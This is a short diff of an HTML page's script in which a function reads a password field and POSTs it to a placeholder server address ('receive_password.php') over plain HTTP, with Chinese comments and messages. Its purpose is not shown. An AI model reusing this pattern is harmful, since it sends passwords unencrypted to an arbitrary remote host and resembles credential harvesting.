@@ -13,20 +13,25 @@
 
     <script>
         function sendPassword() {
-            const password = document.getElementById("password").value;
-            fetch("https://localhost/dashboard/process.php", {  // 改成你的伺服器 IP 或網域
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: "password=" + encodeURIComponent(password)
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById("message").textContent = data;
-            })
-            .catch(error => console.error("錯誤:", error));
-        }
+			const password = document.getElementById("password").value;
+			fetch("http://你的伺服器IP/receive_password.php", {  // 改成你的伺服器 IP 或網域
+			method: "POST",
+			headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+			},
+			body: "password=" + encodeURIComponent(password)
+		})
+		.then(response => response.text())
+		.then(data => {
+			console.log("伺服器回應:", data);
+			document.getElementById("message").textContent = data;
+		})
+		.catch(error => {
+			console.error("錯誤:", error);
+			document.getElementById("message").textContent = "發送失敗：" + error;
+		});
+	}
+
     </script>
 </body>
 </html>
